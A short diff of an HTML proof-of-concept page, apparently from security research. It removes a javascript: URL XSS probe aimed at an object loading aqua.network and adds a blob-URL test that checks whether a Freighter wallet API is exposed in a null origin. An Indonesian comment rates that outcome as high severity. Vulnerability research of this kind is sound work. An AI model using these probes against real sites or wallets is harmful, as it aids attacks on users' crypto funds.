@@ -1,4 +1,9 @@
-<object data="https://aqua.network"></object>
 <script>
-setTimeout(()=>{ document.querySelector('object').data = 'javascript:alert(document.domain)'; }, 2000)
+function testBlob(){
+  const html = `<script>document.write('origin:'+location.origin+' freighterApi:'+!!window.freighterApi)<\/script>`;
+  const blob = new Blob([html], {type:'text/html'});
+  const url = URL.createObjectURL(blob);
+  window.open(url);
+}
+// Kalau di blob:null freighterApi? true = HIGH
 </script>
